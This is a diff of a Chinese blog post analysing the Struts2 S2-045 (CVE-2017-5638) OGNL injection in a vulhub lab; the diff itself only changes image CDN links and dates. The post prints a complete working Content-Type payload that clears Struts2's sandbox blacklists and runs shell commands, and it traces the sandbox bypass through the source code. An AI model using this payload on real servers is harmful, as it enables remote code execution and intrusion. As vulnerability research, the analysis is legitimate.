@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-05-12T08:30:00.000Z">
-<meta property="article:modified_time" content="2026-05-12T09:40:25.822Z">
+<meta property="article:modified_time" content="2026-05-14T10:03:45.617Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="Java">
@@ -70,7 +70,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp2fxa0b">
+  <link rel="stylesheet" href="/css/main.css?v=mp5bt8ie">
 
 
   
@@ -79,7 +79,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-05-12T16:30:00+08:00","dateModified":"2026-05-12T17:40:25+08:00","datePublished":"2026-05-12T16:30:00+08:00","description":"","headline":"代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/c3d8e7f2/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/c3d8e7f2/","keywords":"代码审计, Java, RCE, Struts2, OGNL, S2-045, CVE-2017-5638","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/o4gsLkYFH1AABIRX4wPAayAcPiICmiAEDgXj3~tplv-dy-aweme-images-ds-rs-v1_1920_1080_q80.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-05-12T16:30:00+08:00","dateModified":"2026-05-14T18:03:45+08:00","datePublished":"2026-05-12T16:30:00+08:00","description":"","headline":"代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/c3d8e7f2/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/c3d8e7f2/","keywords":"代码审计, Java, RCE, Struts2, OGNL, S2-045, CVE-2017-5638","thumbnailUrl":"https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/o4gsLkYFH1AABIRX4wPAayAcPiICmiAEDgXj3~tplv-dy-aweme-images-ds-rs-v1_1920_1080_q80.jpg","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -140,19 +140,19 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/struts2/s2-045</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
 <p>起来之后访问 <code>http://127.0.0.1:8080</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_gaj5.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_gaj5.png"></p>
 <p>这里用 yakit 抓个包：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1uuw.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_1uuw.png"></p>
 <p>这是正常的响应包：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzlnKBM4ABUiDAvZG</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_giax.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_giax.png"></p>
 <hr>
 <h2 id="漏洞触发验证"><a href="#漏洞触发验证" class="headerlink" title="漏洞触发验证"></a>漏洞触发验证</h2><p>先把 <code>Content-Type</code> 那一行整个换成下面这个，做个 OGNL 数学计算验证，确认表达式是否被执行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;id&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
 
 <p>发包，命令成功执行并回显：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_fk2k.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_fk2k.png"></p>
 <hr>
 <h2 id="Payload-逐段拆解"><a href="#Payload-逐段拆解" class="headerlink" title="Payload 逐段拆解"></a>Payload 逐段拆解</h2><p>先把这个 payload 拆开看，整体是一个 OGNL 表达式链，塞在 <code>Content-Type</code> 头里。</p>
 <h3 id="是什么"><a href="#是什么" class="headerlink" title="%{...} 是什么"></a><code>%&#123;...&#125;</code> 是什么</h3><p><code>%&#123;...&#125;</code> 是 Struts2 的 OGNL 表达式标记，整个链用 <code>.</code> 串联，分几段。</p>
@@ -182,11 +182,11 @@
 
 <p>最关键的是 <code>enctype=&quot;multipart/form-data&quot;</code>，没有这个请求就是普通表单，<code>Content-Type</code> 就是 <code>application/x-www-form-urlencoded</code>，Jakarta 解析器不会介入，漏洞触发不了。</p>
 <p>访问 <code>http://localhost:8080/upload.jsp</code>，显示正常的表单界面：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_lxfy.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_lxfy.png"></p>
 <hr>
 <h2 id="正常请求流程梳理"><a href="#正常请求流程梳理" class="headerlink" title="正常请求流程梳理"></a>正常请求流程梳理</h2><p>先把正常请求的完整调用链搞清楚，这样后面看漏洞触发点的时候就知道是哪里出了问题。</p>
 <p><code>struts-default.xml</code> 里有自带的拦截器栈：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_djyw.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_djyw.png"></p>
 <p>正常一次文件上传请求的完整流程：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">浏览器访问 http://localhost:8080/upload.jsp</span><br><span class="line">        ↓</span><br><span class="line">    upload.jsp 显示上传表单</span><br><span class="line">        ↓</span><br><span class="line">    点击上传，表单提交到 action=&quot;upload&quot;</span><br><span class="line">        ↓</span><br><span class="line">    web.xml 里 StrutsPrepareAndExecuteFilter 拦截所有请求 /*</span><br><span class="line">        ↓</span><br><span class="line">    检测请求头 Content-Type 包含 multipart/form-data</span><br><span class="line">        ↓</span><br><span class="line">    包装成 MultiPartRequestWrapper，同时调用 JakartaMultiPartRequest.parse() 解析文件</span><br><span class="line">        ↓</span><br><span class="line">    struts.xml 里找到 name=&quot;upload&quot; 对应 com.demo.UploadAction</span><br><span class="line">        ↓</span><br><span class="line">    按顺序执行 defaultStack 拦截器栈</span><br><span class="line">        ↓</span><br><span class="line">    fileUpload 拦截器检测到是 MultiPartRequestWrapper</span><br><span class="line">        ↓</span><br><span class="line">    反射找 Action 里的 setUpload()、setUploadFileName()、setUploadContentType()</span><br><span class="line">        ↓</span><br><span class="line">    把解析好的文件数据注入到对应字段</span><br><span class="line">        ↓</span><br><span class="line">    UploadAction.execute() 返回 SUCCESS</span><br><span class="line">        ↓</span><br><span class="line">    struts.xml 里 result name=&quot;success&quot; 指向 /upload.jsp</span><br><span class="line">        ↓</span><br><span class="line">    回到 upload.jsp</span><br></pre></td></tr></table></figure>
 
@@ -198,17 +198,17 @@
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;</span><br><span class="line">&lt;s:actionerror/&gt;</span><br></pre></td></tr></table></figure>
 
 <p><code>&lt;s:actionerror/&gt;</code> 的作用是把 <code>ActionError</code> 里的内容渲染到页面上：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_ttsz.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_ttsz.png"></p>
 <p>然后就看到返回包里包含计算结果 2：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_sfx1.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_sfx1.png"></p>
 <p>表达式被 OGNL 成功执行了，这里漏洞验证完毕。</p>
 <hr>
 <h2 id="源码调用栈分析"><a href="#源码调用栈分析" class="headerlink" title="源码调用栈分析"></a>源码调用栈分析</h2><p>还是先根据 <code>web.xml</code> 里的 Struts2 监听器 <code>StrutsPrepareAndExecuteFilter</code> 里的 <code>doFilter</code> 为入口断点：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_hdhp.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_hdhp.png"></p>
 <p>在这里面，进入 <code>request = prepare.wrapRequest(request)</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_8fdo.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_8fdo.png"></p>
 <p>进入 <code>request = dispatcher.wrapRequest(request)</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_98kw.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_98kw.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">content_type</span> <span class="operator">=</span> request.getContentType();</span><br></pre></td></tr></table></figure>
 
 <p>取出了请求包里的 <code>ContentType</code>，这里也就是 <code>%&#123;1+1&#125; multipart/form-data</code>。</p>
@@ -219,27 +219,27 @@
 <p>然后进入：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request = <span class="keyword">new</span> <span class="title class_">MultiPartRequestWrapper</span>(mpr, request, getSaveDir(), provider, disableRequestAttributeValueStackLookup);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_aupd.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_aupd.png"></p>
 <p>进入 <code>multi.parse(request, saveDir)</code>，我们的表达式还在 request 里面，<code>saveDir</code> 是保存的临时路径。</p>
 <p><code>parse</code> 里就是检测格式的地方：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_cu66.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_cu66.png"></p>
 <p>明显格式不对，所以会抛出异常：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_3cw7.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_3cw7.png"></p>
 <p>这整个异常信息里带着我们的 payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content type header is %&#123;1+1&#125; multipart/form-data</span><br></pre></td></tr></table></figure>
 
 <p>这个 <code>e.getMessage()</code> 的值就是这整串字符串，接下来会被传进 <code>buildErrorMessage()</code>：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> buildErrorMessage(e, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_drj1.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_drj1.png"></p>
 <p>这里面返回了 <code>LocalizedTextUtil.findText</code>，其中参数 <code>e</code> 就是包含 payload 的错误信息：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_z41s.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_z41s.png"></p>
 <p>然后进入另一个 <code>findText</code> 方法，这里 <code>defaultMessage</code> 是错误信息：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_65tz.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_65tz.png"></p>
 <p>经过一段非常长的查找，最后 <code>indexedTextName</code> 还是 null，进入：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = getDefaultMessage(aTextName, locale, valueStack, args, defaultMessage);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512170040302.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512170040302.png"></p>
 <p>这里 <code>aTextName</code> 是 <code>struts.messages.upload.error.InvalidContentTypeException</code>（错误信息里截取的部分），<code>defaultMessage</code> 是：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the request doesn&#x27;t contain a multipart/form-data or multipart/mixed stream,</span><br><span class="line">content type header is %&#123;1+1&#125; multipart/form-data</span><br></pre></td></tr></table></figure>
 
@@ -251,11 +251,11 @@
 <blockquote>
 <p><strong>注意</strong>：断点进入时不要直接进入，会默认进入 <code>buildMessageFormat</code> 方法，需要手动点击进入 <code>translateVariables</code> 方法里面。</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_6wto.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_6wto.png"></p>
 <p>进入看到了：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_m5wv.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_m5wv.png"></p>
 <p>这和之前看 S2-016 代码审计看到的是一样的，都是 OGNL 的处理逻辑——把表达式 <code>%&#123;&#125;</code> 里的内容提取出来，然后进入 OGNL 计算，得出 <code>2</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_7a91.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_7a91.png"></p>
 <h3 id="漏洞根因总结"><a href="#漏洞根因总结" class="headerlink" title="漏洞根因总结"></a>漏洞根因总结</h3><p>这整体看来基本和 S2-016 一样，只不过触发点不一样。代码会对 <code>Content-Type</code> 里的内容检测是否包含 <code>multipart</code> 字段，但后面的内容格式不对从而触发了异常抛出，而这个异常抛出会经过 OGNL 的检测计算逻辑，导致触发了漏洞。</p>
 <p>S2-045 这个案例特别典型，因为它利用的是错误处理逻辑——开发者压根没想到异常消息也是用户可控的，防御意识完全没有覆盖到这里，这也是为什么这类漏洞危害这么大。</p>
 <blockquote>
@@ -270,68 +270,68 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)&#125;multipart/form-data</span><br></pre></td></tr></table></figure>
 
 <p>但是 calc 并没有执行：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_h710.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_h710.png"></p>
 <p>调试一下看看具体是哪里出了问题。</p>
 <p>可以看到 payload 依然被正常提取出来了，没有被拦截：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_kcds.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_kcds.png"></p>
 <p>在这里可以看到传入的 <code>var</code> 是正常的 payload，但是返回的值却是 null：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_oxry.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_oxry.png"></p>
 <p>说明 OGNL 里的检测肯定没有通过，检测机制在这里面：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_a2rs.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_a2rs.png"></p>
 <p>然后断点进入：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_v42a.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_v42a.png"></p>
 <p>然后是 <code>node.getValue</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1rmn.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_1rmn.png"></p>
 <p>然后这里的 <code>_hasConstantValue</code> 是 false，进入 <code>getValueBody(context, source)</code>，一大段都是处理索引属性的特殊情况：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_0ax2.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_0ax2.png"></p>
 <p>来到最后一段的 <code>_children[i].getValue()</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_pu9y.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_pu9y.png"></p>
 <p>然后就是又来到了这里，这似乎是因为 AST 树是嵌套的，每一层节点都要经过这个方法：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ASTChain.getValueBody()             ← 第一次，处理整个链式调用</span><br><span class="line">    → _children[0].getValue()</span><br><span class="line">        → ASTStaticMethod.getValueBody()  ← 第二次，处理 @Runtime@getRuntime()</span><br><span class="line">            → _children[0].getValue()</span><br><span class="line">                → ASTMethod.getValueBody()  ← 第三次，处理 exec(&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure>
 
 <p>就像俄罗斯套娃，外层节点调用内层节点，每层都要走一遍 <code>evaluateGetValueBody</code>，payload 被一层层拆解执行，直到最里层才真正触发方法调用和 <code>isAccessible()</code> 检查。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_ojdj.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_ojdj.png"></p>
 <p>然后在这个 <code>getValueBody</code> 方法里面</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1e0e.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_1e0e.png"></p>
 <p>payload 的参数方法被拆解了：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_8axd.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_8axd.png"></p>
 <p><code>callStaticMethod</code> 里：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_onen.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_onen.png"></p>
 <p>然后就是 <code>ma.callStaticMethod(context, targetClass, methodName, args)</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_7xvo.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_7xvo.png"></p>
 <p>这里是拦截点，判断 <code>DENY_METHOD_EXECUTION</code> 这个 flag。<code>exec: null，e: false</code>，走进了 <code>if (!e)</code> 分支，方法执行没有被拦截。</p>
 <p>继续跟进 <code>callStaticMethodWithDebugInfo()</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_zyp6.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_zyp6.png"></p>
 <p>进入，<code>super.callStaticMethod</code> 查找方法，相当于找到 <code>getRuntime()</code> 这个方法对象：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_y1da.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_y1da.png"></p>
 <p>跟进 <code>callAppropriateMethod()</code>，看到了 <code>isMethodAccessible()</code>，如果没有通过就会直接抛出异常，不继续执行下面的代码，通过了才走到 <code>invokeMethod()</code> 真正执行 <code>getRuntime()</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_uec7.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_uec7.png"></p>
 <p>而 <code>isMethodAccessible()</code> 就是沙箱检查，必须通过才能继续：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_tqp1.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_tqp1.png"></p>
 <p>进入看看：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_jlub.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_jlub.png"></p>
 <p>再次进入：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_c7he.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_c7he.png"></p>
 <p>最后发现只有一个 <code>return _memberAccess</code>，而 <code>_memberAccess</code> 不是一个普通的参数，而是一个对象。<code>.getMemberAccess()</code> 之后就是 <code>.isAccessible()</code>，这里是真正的检测方法。</p>
 <p>这两段拿到这两个 Class 对象用来后面的黑名单对比：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_i49y.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_i49y.png"></p>
 <p>三个检测：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_oqtr.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_oqtr.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一个：检查包名黑名单，比如 java.lang、ognl 这些包是否被禁止</span></span><br><span class="line"><span class="comment">// 第二个：检查调用者的类是否在黑名单里，比如 Runtime.class</span></span><br><span class="line"><span class="comment">// 第三个：检查方法声明所在的类是否在黑名单里，比如 Runtime.class</span></span><br></pre></td></tr></table></figure>
 
 <p>三个都没拦截才能走到最后：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_tfwh.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_tfwh.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类的基础访问检查，比如 private/public 修饰符</span></span><br></pre></td></tr></table></figure>
 
 <p>先看看会不会被检测到。<code>isPackageExcluded</code> 这个方法里面有两个检测，第一个没有检测到，但是第二个检测到了，被拦截了，这就是 RCE 没有正常执行的原因：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_j0o3.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_j0o3.png"></p>
 <p>这是对三个黑名单的检测</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_w4ms.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_w4ms.png"></p>
 <hr>
 <h3 id="第二步：尝试-clear-清空黑名单"><a href="#第二步：尝试-clear-清空黑名单" class="headerlink" title="第二步：尝试 clear() 清空黑名单"></a>第二步：尝试 clear() 清空黑名单</h3><p>针对这三个黑名单的检测，一般的审计都是要分析具体是什么被检测了、黑名单是什么。但是这个 payload 绕过不一样，非常暴力，直接把黑名单清空。</p>
 <p>问题是：为什么能把黑名单清空，这个思路是怎么发现的？</p>
 <p>在 <code>SecurityMemberAccess</code> 这个类里面有个 set 方法：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_2bld.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_2bld.png"></p>
 <p>那是不是意味着可以直接 set 一个空的内容给黑名单？</p>
 <p>理论上可以，但实际上不行，因为在 payload 里面是拿不到 <code>SecurityMemberAccess</code> 这个对象的。</p>
 <p><code>SecurityMemberAccess</code> 没有注册到 Struts2 的 IoC 容器里，<code>OgnlUtil</code> 注册了：</p>
@@ -339,11 +339,11 @@
 
 <p><code>SecurityMemberAccess</code> 是在每次请求时由 Struts2 内部创建的，不是单例，不在容器里管理，没有公开的获取途径，所以 payload 里没办法直接拿到它的实例。</p>
 <p>选中 set 方法看是谁调用了它，找到了 <code>OgnlUtil</code> 里面：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_dfjq.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_dfjq.png"></p>
 <p>可以看到这里还有其他的黑名单被创建，而 set 的参数是直接用的固定的值，这些值在初始化的时候就被建立：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1oab.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_1oab.png"></p>
 <p><code>OgnlUtil</code> 类里面是有 set 和 get 方法的：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_0z5l.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_0z5l.png"></p>
 <p>注意到 get 方法返回的是一个 <code>Set</code> 对象，<code>Set</code> 对象是自带 <code>clear()</code> 方法的，这样就能清空黑名单了。</p>
